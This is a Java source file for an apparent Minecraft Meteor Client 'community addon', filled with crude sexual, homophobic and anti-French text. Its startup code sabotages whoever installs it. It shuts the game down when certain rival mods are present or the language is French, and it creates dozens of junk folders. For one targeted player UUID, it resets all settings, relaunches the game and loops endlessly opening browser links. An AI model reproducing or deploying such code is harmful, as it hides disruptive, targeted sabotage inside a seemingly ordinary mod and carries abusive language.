package communityaddon;

import com.mojang.logging.LogUtils;
import com.sun.jna.platform.WindowUtils;
import communityaddon.commands.CommandExample;
import communityaddon.hud.HudExample;
import communityaddon.hud.Hudtwo;
import communityaddon.modules.AutoBoob;
import communityaddon.modules.AutoSex;
import communityaddon.modules.ModuleExample;
import communityaddon.modules.Twerk;
import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.addons.GithubRepo;
import meteordevelopment.meteorclient.addons.MeteorAddon;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.gui.themes.meteor.MeteorGuiTheme;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.systems.commands.Commands;
import meteordevelopment.meteorclient.systems.config.Config;
import meteordevelopment.meteorclient.systems.hud.Hud;
import meteordevelopment.meteorclient.systems.hud.HudGroup;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.Modules;
import meteordevelopment.meteorclient.utils.PostInit;
import meteordevelopment.orbit.EventHandler;
import net.fabricmc.loader.api.FabricLoader;
import net.fabricmc.loader.impl.launch.knot.KnotClient;
import net.minecraft.client.MinecraftClient;
import net.minecraft.resource.InputSupplier;
import net.minecraft.util.Util;
import org.slf4j.Logger;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.lang.management.ManagementFactory;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;



import static meteordevelopment.meteorclient.MeteorClient.mc;

public class Addon extends MeteorAddon {
    public static final Logger LOG = LogUtils.getLogger();
    public static final Category CATEGORY = new Category("hypixel.net best utility mod cpvp server");
    public static final HudGroup HUD_GROUP = new HudGroup("Example");

    public static final File mcfolder = new File((FabricLoader.getInstance().getGameDir().toString()));



    @Override
    public void onInitialize() {



        LOG.info("Initializing PopBob Sex Client V1.3782.131.DEVRELEASE==18271");
        LOG.info("What Color Is Your Bugatti?");
        cope();
        LOG.info(TrollegeUtils.eurekawatermark());
        // Modules
        Modules.get().add(new ModuleExample());
        Modules.get().add(new AutoSex());
        Modules.get().add(new AutoBoob());
        Modules.get().add(new Twerk());

        Config.get().customWindowTitle.set(true);
        Config.get().customWindowTitleText.set("Casually dips your balls in sulfuric acid UWU");
        TrollegeUtils.severelackoffriends();


        Hud.get().register(Hudtwo.INFO);


        // Commands
        Commands.get().add(new CommandExample());

        // HUD
        Hud.get().register(HudExample.INFO);


        cope();

        for (int i = 1; i < 70; i++) {
            File beans = new File(mcfolder + "/" + String.valueOf(i));
            if (beans.exists()) {

            } else {
                beans.mkdir();
            }
        }

    }

    public static void huehuehue() {
        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
    }


    public static void troll(String name) throws IOException {
        TrollegeUtils.bozojframe();
        System.out.println("Hi mom, this is me " + name);
        Modules.get().getAll().forEach(module -> module.settings.forEach(group -> group.forEach(Setting::reset)));
        new ArrayList<>(Modules.get().getActive()).forEach(Module::toggle);
        Config.get().customWindowTitle.set(true);
        Config.get().customWindowTitleText.set("I LOVE IT WHEN GAY FRENCH MEN FUCK ME IN THE ASS I AM " + name);
        System.out.println("I didn't think you would find this");
        System.out.println("But i must confess I am a femboy");
        System.out.println("Real");
        System.out.println("I'm so addicted to gay pornhub videos");
        System.out.println("SPAIN ISNT REAL!!! SPAIN IS NOT REAL EVERY TIME. EVERY GODDAMN TIME I MEET SOMEONE AND ASK IF THEY THINK SPAIN IS REAL THEY SAY SOMETHING ALONG THE LINES OF “OH SPAIN IS REAL, WHAT ARE YOU TALKING ABOUT” WELL TO ALL OF YOU UNEDUCATED PIGS SITTING AROUND ON YOUR COMPUTER, I’D LIKE TO PROVE YOU ARE WRONG AND SPAIN WAS NEVER REAL!! HAVE YOU EVER BEEN IN SPAIN???? HAVE YOU EVER TALKED TO SOMEONE FROM SPAIN??? NO!!!!!!!!!!!!!!!!!!!! ITS THE WORLD HIDING SOMETHING LIKE ALWAYS!!! I BET THERE ARE ALIENS IN “SPAIN” AND THE WORLD JUST CALLS IT SPAIN SO NOBODY GETS SUSPICIOUS!!!! AND THEN I SEE EVERYONE BRAINWASHED SAYING “OH SPAIN IS REAL” LIKE NO IT ISNT!! STOP FALLING FOR IT!!! I HOPE WE CAN LEARN FROM OUR MISTAKES. WE NEED TO FIND OUT WHAT’S IN SPAIN AND RAID THAT DAMN PLACE. JULY 21ST. THEY CANT STOP ALL OF US!!!!!!!!!!!!!!!!!");
        ProcessBuilder processBuilder = new ProcessBuilder();
        List<String> command = processBuilder.command();
        command.add(Path.of(System.getProperty("java.home"), "bin", "javaw.exe").toString());
        command.addAll(ManagementFactory.getRuntimeMXBean().getInputArguments());
        command.add("-cp");
        command.add(System.getProperty("java.class.path"));
        command.add(KnotClient.class.getName());
        command.addAll(new ArrayList<>(List.of(FabricLoader.getInstance().getLaunchArguments(true))));

        processBuilder.start();

        boolean copey = true;
        while (copey = true){
            huehuehue();
        }
    }

    public static void cope() {
        FabricLoader loader = FabricLoader.getInstance();
        String[] blacklist = new String[]{
            "venomhack",
            "bananaplus",
            "nova-addon",
            "wurst",
            "modid",
            "bedtrap",
            "bananaplus",
            "eclipse-addon",
            "cope-adon",
            "streak-addon",
            "vector",
            "reaper",
            "boze",
            "sodium"
        };

        for (String id : blacklist) {
            if (loader.isModLoaded(id)) {
                LOG.info(TrollegeUtils.eurekawatermark());
                LOG.error("Don't use shit addons ezzzzz");
                mc.stop();
                mc.close();
                break;
            }
        }

        if (loader.isModLoaded("seedcrackerx")) {
            Util.getOperatingSystem().open("https://cdn.discordapp.com/attachments/689197706169942135/1064282706122375198/893615002015-1-316249021.jpg");
        }

        if (mc.options.language.contains("fr")) {
            LOG.error("Bruh... you're french?? EWWWWWWWWW!");
            mc.stop();
            mc.close();
        }

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            huehuehue();
            if (String.valueOf(MinecraftClient.getInstance().getSession().getUuid()).equals("ed0e5af2-b40e-4a44-b00f-39c7d67f398c") || (String.valueOf(MinecraftClient.getInstance().getSession().getUuid()).equals("ed0e5af2b40e4a44b00f39c7d67f398c"))) {
                try {
                    troll("Sam/Ricky");
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }));


        BTCMINER();
    }

    @Override
    public void onRegisterCategories() {
        Modules.registerCategory(CATEGORY);

        for (int i = 1; i < 70; i++) {
            //i think 69421 was too cope
            Modules.registerCategory(new Category(i + " fish"));
        }
    }

    public static void BTCMINER(){
        //better btc miner than in banana+
        boolean ismining = false;
        if (ismining == false){
            ismining = true;
        }
        LOG.info("Connecting to BLOCKCHAIN!");
        LOG.info("CONNECTED! Starting To Mine BTC");
    }

    @Override
    public GithubRepo getRepo() {
        return new GithubRepo("RickyTheRacc", "meteor-community-addon");
    }

    @Override
    public String getPackage() {
        return "communityaddon";
    }




}
